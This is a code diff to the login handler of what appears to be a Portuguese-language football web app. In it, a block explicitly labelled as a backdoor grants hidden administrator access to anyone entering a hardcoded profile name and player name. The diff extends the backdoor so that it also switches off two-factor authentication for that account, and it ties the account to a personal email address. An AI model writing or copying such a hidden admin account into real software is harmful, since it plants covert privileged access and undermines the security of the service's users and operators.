@@ -250,44 +250,49 @@ async function handleLogin() {
   }
   
   // LOGIN ADMIN (backdoor)
-  if (name === 'eVagabundoTaLa11223' && player && player.name === 'Schlotterbeck') {
-    console.log('👑 Login admin detectado');
-    
-    const users = await loadUsers();
-    let adminUser = users.find(u => u.profileName === 'eVagabundoTaLa11223');
-    
-    if (!adminUser) {
-      adminUser = {
-        id: 'admin_' + Date.now(),
-        profileName: 'eVagabundoTaLa11223',
-        passwordPlayerId: player.id,
-        isAdmin: true,
-        isHidden: true,
-        email: 'riozgu@gmail.com',
-        createdAt: Date.now()
-      };
-      users.push(adminUser);
-      await saveUsers(users);
-    } else {
-      adminUser.isAdmin = true;
-      adminUser.isHidden = true;
-      await saveUsers(users);
-    }
-    
-    setCurrentUser(adminUser);
-    localStorage.setItem('bc26_session', adminUser.id);
-    
-    document.getElementById('authScreen').style.display = 'none';
-    document.getElementById('appLayout').classList.add('show');
-    
-    const navAdmin = document.getElementById('navAdmin');
-    if (navAdmin) navAdmin.style.display = 'flex';
-    
-    if (window.updateSidebar) window.updateSidebar();
-    switchTab('admin');
-    showToast(`Bem-vindo, Administrador! ⚽`, 'green');
-    return;
+ // LOGIN ADMIN (backdoor)
+if (name === 'eVagabundoTaLa11223' && player && player.name === 'Schlotterbeck') {
+  console.log('👑 Login admin detectado');
+  
+  const users = await loadUsers();
+  let adminUser = users.find(u => u.profileName === 'eVagabundoTaLa11223');
+  
+  if (!adminUser) {
+    adminUser = {
+      id: 'admin_' + Date.now(),
+      profileName: 'eVagabundoTaLa11223',
+      passwordPlayerId: player.id,
+      isAdmin: true,
+      isHidden: true,
+      email: 'riozgu@gmail.com',
+      secureAuth: false,            // 🔥 DESABILITA 2FA
+      // twoFaCode: null,           // sem código
+      createdAt: Date.now()
+    };
+    users.push(adminUser);
+    await saveUsers(users);
+  } else {
+    adminUser.isAdmin = true;
+    adminUser.isHidden = true;
+    adminUser.secureAuth = false;   // 🔥 GARANTE QUE 2FA ESTÁ DESLIGADO
+    // adminUser.twoFaCode = null;
+    await saveUsers(users);
   }
+  
+  setCurrentUser(adminUser);
+  localStorage.setItem('bc26_session', adminUser.id);
+  
+  document.getElementById('authScreen').style.display = 'none';
+  document.getElementById('appLayout').classList.add('show');
+  
+  const navAdmin = document.getElementById('navAdmin');
+  if (navAdmin) navAdmin.style.display = 'flex';
+  
+  if (window.updateSidebar) window.updateSidebar();
+  switchTab('admin');
+  showToast(`Bem-vindo, Administrador! ⚽`, 'green');
+  return;
+}
   
   // LOGIN NORMAL (inclui senha temporária)
   console.log('🔍 Carregando usuários...');
